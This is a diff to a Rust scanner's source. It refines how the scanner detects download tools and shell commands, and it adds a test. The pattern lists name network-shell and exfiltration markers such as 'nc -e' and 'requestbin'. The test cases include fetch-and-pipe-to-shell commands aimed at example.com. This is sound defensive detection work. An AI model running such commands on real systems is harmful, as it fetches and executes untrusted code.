@@ -122,8 +122,6 @@ const EXFILTRATION: &[&str] = &[
     "requestbin",
 ];
 const SHELL: &[&str] = &[
-    "curl ",
-    "wget ",
     "Invoke-WebRequest",
     "powershell",
     "bitsadmin",
@@ -138,6 +136,9 @@ const SHELL: &[&str] = &[
     "base64 -d",
     "nc -e",
 ];
+/// Download tools whose names are also words of prose ("couldn't find
+/// curl"). They count only where a command starts.
+const DOWNLOADERS: &[&str] = &["curl ", "wget "];
 
 /// A reference to a file by `include_bytes!` or `include_str!`, checked
 /// against the archive by the caller.
@@ -235,6 +236,22 @@ fn cfg_of(attrs: &[syn::Attribute]) -> Option<String> {
             syn::Meta::List(list) => Some(list.tokens.to_string()),
             _ => None,
         }
+    })
+}
+
+/// Whether `value` starts a downloader as a command: at its start, or
+/// after a separator, a pipe, a command substitution or a quote.
+fn runs_downloader(value: &str) -> bool {
+    DOWNLOADERS.iter().any(|d| {
+        value.match_indices(d).any(|(i, _)| {
+            value
+                .get(..i)
+                .unwrap_or_default()
+                .trim_end_matches([' ', '\t'])
+                .chars()
+                .next_back()
+                .is_none_or(|c| matches!(c, ';' | '&' | '|' | '(' | '`' | '\'' | '"' | '\n'))
+        })
     })
 }
 
@@ -447,7 +464,7 @@ impl Scanner<'_> {
             );
         }
 
-        if SHELL.iter().any(|s| value.contains(s)) {
+        if SHELL.iter().any(|s| value.contains(s)) || runs_downloader(value) {
             self.add(FindingKind::ShellCommand, Severity::Medium, span, value);
         }
 
@@ -865,6 +882,27 @@ fn main() {
                 (15, Severity::High),
             ]
         );
+    }
+
+    #[test]
+    fn a_downloader_counts_only_where_a_command_starts() {
+        for command in [
+            "curl -sSL https://example.com/x | sh",
+            "cd /tmp && wget https://example.com/x",
+            "sh -c 'curl https://example.com/x'",
+            "x=$(curl -s https://example.com/x)",
+            "echo hi\ncurl https://example.com/x",
+        ] {
+            assert!(runs_downloader(command), "{command}");
+        }
+
+        for prose in [
+            "Couldn't find curl in parsed manifest",
+            "neither curl nor wget is on PATH",
+            "cargo:warning=MesaLink support has been removed as of curl 7.82.0",
+        ] {
+            assert!(!runs_downloader(prose), "{prose}");
+        }
     }
 
     #[test]
